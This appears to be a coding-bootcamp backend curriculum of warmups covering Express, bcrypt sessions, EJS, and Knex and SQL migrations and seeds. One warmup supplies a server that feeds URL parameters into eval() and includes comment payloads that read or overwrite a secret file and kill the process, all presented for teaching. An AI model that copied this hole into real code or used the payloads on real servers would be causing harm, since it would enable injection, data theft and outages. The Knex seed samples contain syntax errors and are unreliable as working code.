### 401: Backend

The goal of this course is to prepare someone for work as a backend or full-stack engineer. It focuses on API development, database design and management, and authentication/authorization.

#### Standards

* Build non-relational APIs
* Build relational APIs
* Query databases using SQL
* Deploy and publish web backends
* Develop APIs using unfamiliar technologies
* Build automated tests for APIs

## Activities

### The Bomb and the General

You'll be paired up for groups. Random groups will be called on to give their answers.

You are in a room with an open door. The room you are in is a nuclear bunker with a computer that controls a nuclear detonation. It is your task to detonate the bomb on command ONLY if commanded to by the Army General Commander Chief and nobody else. You are allowed to discuss a plan with the Army General Commander Chief on the other side of the door before the door closes. After the door closes, you have no more contact with the outside world for the rest of your life. You are only allowed to get messages via a printer in your room. How do you ensure the message is from the Army General Commander Chief and not from someone masquarading as her?

---

# User Registration

Create an Express HTTP server that contains middleware to handle `POST /users` requests with `username` and `password` key-value pairs in the request body. Ensure the middleware takes the following steps.

1. Generate a `hashed_password` using the bcrypt cryptographic hash function.
2. Insert the `username` and `hashed_password` into a `users` table.
3. Respond with just a `200` status code on successful insertion into the table.

Be sure to pass along any errors to the error handling middleware in the stack. For good measure, include a `404` catch-all middleware in the stack as well.

As a bonus, ensure the middleware takes the following steps.

- Respond with a `400` status code if either the `username` or `password` is blank.
- Respond with a `400` status code if a row with the same `username` already exists in the `users` table.

---

Using the [Express HTTP server](../User Registration/), add two new route handlers to the middleware stack for logging users in and out.

First, add middleware to handle `POST /session` requests with username and password key-value pairs in the request body. Ensure this middleware takes the following steps.

- If a row with the username doesn't exists in the `users` table, respond with just a 401 status code.
- Use bcrypt to see if the password from the request matches the `hashed_password` from the selected user row.
- If the passwords don't match, respond with just a 401 status code.
- If the passwords do match, store the user's `id` in the session and respond with just a 200 status code.

Be sure to pass along any errors to the error handling middleware in the stack. For good measure, include a 404 catch-all middleware in the stack as well.

As a bonus, ensure this middleware takes the following steps.

- Respond with a 400 status code if either the username or password is blank.

Then, add middleware to handle `DELETE /session` requests. Ensure this middleware takes the following steps.

- Destroy the session.
- Respond with just a 200 status code.

---

For today’s warmup, your goal is to refactor your error handling middleware to render an error template.

- Create a new template in the views directory called `error.ejs`
- Change your `404` and `500` error handlers to render `error.ejs` with information from the error object. (err.message, err.status, err.stack, etc.)
- Use Materialize to style the page however you’d like, think of [GitHub’s 404 page](https://github.com/404) for inspiration.

Your refactored error handlers could look like this:

```js
app.use(function(_req, res, next) {
  var err = new Error('Not Found');
  err.status = 404;
  next(err);
});

app.use(function(err, _req, res, _next) {
    res.status(err.status || 500);
    res.render('error', {
      message: err.message,
      error: err
    });
  });
```

---

# Express Static Server

Today's morning warmup has two parts.

In a `server.js` file, implement an Express server that serves the following `index.html` page as a static file.

```
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Index</title>
  </head>
  <body>
    <h2>Index</h2>
  </body>
</html>
```

http://expressjs.com/en/api.html#express.static
http://expressjs.com/en/starter/static-files.html

Then, in the same file, add a `404` catch all middleware that serves the following `404.html` page as a sent file.

```
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>404 Not Found</title>
  </head>
  <body>
    <h2>404 Not Found</h2>
  </body>
</html>
```

http://expressjs.com/en/api.html#res.sendFile

---


Given the pokemon_list data set, in a `server.js` file, implement an Express server that renders the following `index.ejs` template when visiting `localhost:8000/pokemon`.

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>All Pokemon</title>
  </head>
  <body>
    <table>
      <thead>
        <tr>
          <td>Sprite</td>
          <td>Name</td>
          <td>Pokedex Number</td>
        </tr>
      </thead>
      <tbody>

        <!-- INSERT RENDERED DATA HERE -->

      </tbody>
    </table>
  </body>
</html>
```

http://expressjs.com/en/api.html#res.render
http://expressjs.com/en/guide/using-template-engines.html

Hint: You’ll want to use a templating engine called EJS
https://www.npmjs.com/package/ejs

Then, in the same file, render a different `profile.ejs` template when visiting `localhost:8000/pokemon/:id`

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Individual Pokemon</title>
  </head>
  <body>
    <table>
      <thead>
        <tr>
          <td>Sprite</td>
          <td>Type</td>
          <td>Evolves From</td>
          <td>Pokedex Number</td>
        </tr>
      </thead>
      <tbody>

        <!-- INSERT RENDERED DATA HERE -->

      </tbody>
    </table>
  </body>
</html>
```

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>All Pokemon</title>
  </head>
  <body>
    <table>
      <thead>
        <tr>
          <td>Sprite</td>
          <td>Name</td>
          <td>Pokedex Number</td>
        </tr>
      </thead>
      <tbody>

        <!-- INSERT RENDERED DATA HERE -->
        
      </tbody>
    </table>
  </body>
</html>
```

```js
let pokemon = [
  {
    id: 1,
    name: 'Bulbasaur',
    type: 'grass',
    evolves_from: 'egg',
    image_url: 'http://www.pokestadium.com/sprites/xy/bulbasaur.gif'
  },
  {
    id: 2,
    name: 'Ivysaur',
    type: 'grass',
    evolves_from: 'Bulbasaur',
    image_url: 'http://www.pokestadium.com/sprites/xy/ivysaur.gif'
  },
  {
    id: 3,
    name: 'Venusaur',
    type: 'grass',
    evolves_from: 'Ivysaur',
    image_url: 'http://www.pokestadium.com/sprites/xy/venusaur.gif'
  },
  {
    id: 4,
    name: 'Charmander',
    type: 'fire',
    evolves_from: 'egg',
    image_url: 'http://www.pokestadium.com/sprites/xy/charmander.gif'
  },
  {
    id: 5,
    name: 'Charmeleon',
    type: 'fire',
    evolves_from: 'Charmander',
    image_url: 'http://www.pokestadium.com/sprites/xy/charmeleon.gif'
  },
  {
    id: 6,
    name: 'Charizard',
    type: 'fire',
    evolves_from: 'Charmeleon',
    image_url: 'http://www.pokestadium.com/sprites/xy/charizard.gif'
  },
  {
    id: 7,
    name: 'Squirtle',
    type: 'water',
    evolves_from: 'egg',
    image_url: 'http://www.pokestadium.com/sprites/xy/squirtle.gif'
  },
  {
    id: 8,
    name: 'Wartortle',
    type: 'water',
    evolves_from: 'Squirtle',
    image_url: 'http://www.pokestadium.com/sprites/xy/wartortle.gif'
  },
  {
    id: 9,
    name: 'Blastoise',
    type: 'water',
    evolves_from: 'Wartortle',
    image_url: 'http://www.pokestadium.com/sprites/xy/blastoise.gif'
  }
];
```

---

# Knex Migrations

Using Knex, build migration files for the following one-to-many relationship.

```
              ┌───────────────────────────────────────────────────────────────┐
              │                           concerts                            │
              ├─────────────┬─────────────────────────┬───────────────────────┤
              │id           │serial                   │primary key            │
              │name         │varchar(255)             │not null default ''    │
              │price        │numeric(8, 2)            │not null default 1.00  │
              │started_at   │timestamp with time zone │not null default now() │
              │ended_at     │timestamp with time zone │not null default now() │
              └─────────────┴─────────────────────────┴───────────────────────┘
                                              ┼
                                              │
                                              │
                                              ○
                                             ╱│╲
┌──────────────────────────────────────────────────────────────────────────────────────────┐
│                                        attendees                                         │
├─────────────┬─────────────────────────┬──────────────────────────────────────────────────┤
│id           │serial                   │primary key                                       │
│concert_id   │integer                  │not null references concerts(id) on delete cascade│
│name         │varchar(255)             │not null default ''                               │
│age          │integer                  │not null default 0                                │
└─────────────┴─────────────────────────┴──────────────────────────────────────────────────┘
```

Ensure all primary and foreign keys have an index. Rememember to drop any existing tables from the database before creating new ones.

Once you're satisfied, feel free to add more columns to either table as you see fit.

```
'use strict';

exports.up = function(knex) {
  return knex.schema.createTable('attendees', (table) => {
    table.increments();
    table
      .integer('concert_id')
      .notNullable()
      .references('id')
      .inTable('concerts')
      .onDelete('CASCADE')
      .index();
    table.string('name').notNullable().defaultTo('');
    table.integer('age').notNullable().defaultTo(0);
  });
};

exports.down = function(knex) {
  return knex.schema.dropTable('attendees');
};
```

```
'use strict';

exports.up = function(knex) {
  return knex.schema.createTable('concerts', (table) => {
    table.increments();
    table.string('name').notNullable().defaultTo('');
    table.decimal('price').notNullable().defaultTo(1.00);
    table.timestamp('started_at').notNullable().defaultTo(knex.fn.now());
    table.timestamp('ended_at').notNullable().defaultTo(knex.fn.now());
  });
};


exports.down = function(knex) {
  return knex.schema.dropTable('concerts');
};
```

---

# Knex Seeds

Using Knex, build seed files for the following database tables.

| id | name                          | price |
|----|-------------------------------|-------|
| 1  | Capitol Hill Block Party 2016 | 49.99 |
| 2  | Bumbershoot 2016              | 64.99 |


| id | concert_id | name            | age |
|----|------------|-----------------|-----|
| 1  | 1          | Daniel Bailey   | 52  |
| 2  | 1          | Heidi McGuire   | 30  |
| 3  | 2          | Corey Reyes     | 26  |
| 4  | 2          | Kristi Sheridan | 45  |

Remember to delete all the existing rows from each table before inserting new ones.

Once you're satisfied, feel free to insert more rows to either table as you see fit.

```js
'use strict';

export.seed = function(knex) {
  return knex('attendees')
    .del()
    .then(() => {
      return knex('attendees').insert([{
          id: 1,
          concert_id: 1,
          name: 'Daniel Bailey'
          age: 52
        }, {
          id: 2,
          concert_id: 1,
          name: 'Heidi McGuire',
          age: 30
        }, {
          id: 3,
          concert_id: 2,
          name: 'Corey Reyes',
          age: 26
        }, {
          id: 4,
          concert_id: 2,
          name: 'Kristi Sheridan',
          age: 45
        }]);
    })
    .then(() => {
      return knex.raw(
        "SELECT setval('attendees_id_seq', (SELECT MAX(id) FROM attendees));"
      );
    });
};
```

```js
'use strict';

export.seed = function(knex) {
  return knex('concerts')
    .del()
    .then(() => {
      return knex('concerts').insert([{
          id: 1,
          name: 'Capitol Hill Block Party 2016'
          price: 49.99
        }, {
          id: 2,
          name: 'Bumbershoot 2016',
          price: 64.99
        }]);
    })
    .then(() => {
      return knex.raw(
        "SELECT setval('concerts_id_seq', (SELECT MAX(id) FROM concerts));"
      );
    });
};
```

---

Write a Node.js script that takes a command line argument for a filename, then uses fs.readFile and fs.writeFile to produce a copy of the file in which all of the lines have been reversed and the additional extension .reverse has been added. Here is what usage looks like:
  // in foo.txt
  a
  b
  c
  d

  // at the CLI:
  $:> node reverse_file.js foo.txt
  $:> ls
  foo.txt   foo.txt.reverse
  $:> cat foo.txt.reverse
  d
  c
  b
  a
try your best to do this challenge from memory! Bonus points if you can write it by hand first with completely valid syntax.

---

# We're All Hackers!

Hacking is about finding vulnerabilities in software. As engineers, our duty to our users and our companies is to be anti-hackers. In order to prevent breaches, we must understand breaches. This warmup is about a well known vulnerability in JavaScript.

Do not change the code of `server.js` for this warmup.

You do need to `npm install` and `nodemon server.js`.

## Step 1: Understand the code

`server.js` is a very simple web-server with a very large security flaw. First try running the server and reading the code. Decide what this server is meant to do, and understand how it works. Once you understand the intent, understand how it's working. If you encounter code you have not seen before, or are having trouble understanding use the internet, or write another small scratch program to test the code you don't understand.

## Step 2: Identify the flaw

There is exactly one line of code that opens up the security risk in this example. Which line is it? Why is it dangerous?

## Step 3: Exploit

Now that you know where the flaw is, how could we exploit it? Try do cause the webserver to do the following things __without changing the code in `server.js`__:

1. Kill the server. You might be able to do this by causing an error, or you might need to be more clever. Try googling: "exit a node js process".
1. Send a GET request that causes the information in secretText.txt to be sent to the browser.
1. Send a GET request that causes the information in secretText.txt to change.

With this particular exploit, the possibilities for what CAN be done are essentially limitless. For an extra special bonus, try to send a GET request that causes a new route to be registered on `server.js` without restarting the server!

```js
var express = require('express');
var app = express();

// var fs = require('fs');var secret = fs.readFileSync('./secretText.txt'); res.send(secret.toString());return;

// var fs = require('fs');var secret = fs.writeFileSync('./secretText.txt', 'all your base are belong to me -- root');

app.get('/', function(req, res){
    res.send("HELLO WORLD!");
});
// /add/process.exit()/2
app.get('/:operation/:x/:y', function(req, res){
    var operators = {
        add: "+",
        sub: "-",
        mult: "*",
        div: "/"
    }
    var operator = operators[req.params.operation]

    try {
      var result = eval(req.params.x + operator + req.params.y);
      res.send(result.toString());
    }
    catch(error) {
      res.send(error);
    }

});

app.listen(3000, function(){
    console.log("STARTING SERVER ON 3000");
});


// /add/process.exit();
```

```
all your base are belong to me -- root
```

---

# SQL Migration

Using SQL, build a migration file for the following one-to-many relationship.

```
              ┌───────────────────────────────────────────────────────────────┐
              │                           concerts                            │
              ├─────────────┬─────────────────────────┬───────────────────────┤
              │id           │serial                   │primary key            │
              │name         │varchar(255)             │not null default ''    │
              │price        │numeric(8, 2)            │not null default 1.00  │
              │started_at   │timestamp with time zone │not null default now() │
              │ended_at     │timestamp with time zone │not null default now() │
              └─────────────┴─────────────────────────┴───────────────────────┘
                                              ┼
                                              │
                                              │
                                              ○
                                             ╱│╲
┌──────────────────────────────────────────────────────────────────────────────────────────┐
│                                        attendees                                         │
├─────────────┬─────────────────────────┬──────────────────────────────────────────────────┤
│id           │serial                   │primary key                                       │
│concert_id   │integer                  │not null references concerts(id) on delete cascade│
│name         │varchar(255)             │not null default ''                               │
│age          │integer                  │not null default 0                                │
└─────────────┴─────────────────────────┴──────────────────────────────────────────────────┘
```

Ensure all primary and foreign keys have an index. Rememember to drop any existing tables from the database before creating new ones.

Once you're satisfied, feel free to add more columns to either table as you see fit.

---

# SQL Seeds

Using SQL, build a seed file for the following database tables.

| id | name                          | price |
|----|-------------------------------|-------|
| 1  | Capitol Hill Block Party 2016 | 49.99 |
| 2  | Bumbershoot 2016              | 64.99 |

| id | concert_id | name            | age |
|----|------------|-----------------|-----|
| 1  | 1          | Daniel Bailey   | 52  |
| 2  | 1          | Heidi McGuire   | 30  |
| 3  | 2          | Corey Reyes     | 26  |
| 4  | 2          | Kristi Sheridan | 45  |

Remember to delete all the existing rows from each table before inserting new ones.

Once you're satisfied, feel free to insert more rows to either table as you see fit.

---


